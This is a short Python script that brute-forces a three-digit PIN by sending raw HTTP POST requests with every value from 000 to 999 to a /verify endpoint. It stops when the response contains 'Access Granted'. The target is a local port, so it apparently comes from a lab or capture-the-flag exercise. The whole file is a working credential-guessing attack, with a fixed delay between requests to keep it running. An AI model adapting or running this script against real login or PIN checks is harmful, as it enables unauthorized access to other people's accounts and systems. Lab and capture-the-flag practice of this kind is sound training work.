import socket
import time

# Constants
HOST = '127.0.0.1'
PORT = 8888
DELAY = 1.2

def try_pin(pin):
    # Format PIN to ensure 3 digits with leading zeros
    pin_str = f"{pin:03d}"
    data = f"magicNumber={pin_str}"
    
    # Create HTTP request
    request = (
        f"POST /verify HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(data)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{data}"
    )
    
    try:
        # Connect and send request
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(5)  # Add timeout to prevent hanging
            sock.connect((HOST, PORT))
            sock.sendall(request.encode())
            
            # Receive response
            response = b""
            while True:
                try:
                    chunk = sock.recv(1024)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    print(f"Socket timed out while receiving data for PIN {pin_str}")
                    break
        
        # Decode response
        decoded = response.decode(errors="ignore")
        
        # Check for success
        if "Access Granted" in decoded:
            print(f"SUCCESS! PIN: {pin_str}")
            return True
        
        print(f"Trying PIN {pin_str}")
        return False
    
    except socket.error as e:
        print(f"Socket error with PIN {pin_str}: {e}")
        time.sleep(DELAY * 2)  # Wait longer on error
        return False

def main():
    # Try PINs sequentially from 000 to 999
    for pin in range(1000):
        if try_pin(pin):
            print(f"Found correct PIN: {pin:03d}")
            break
        
        # Simple fixed delay between requests
        time.sleep(DELAY)

if __name__ == "__main__":
    main()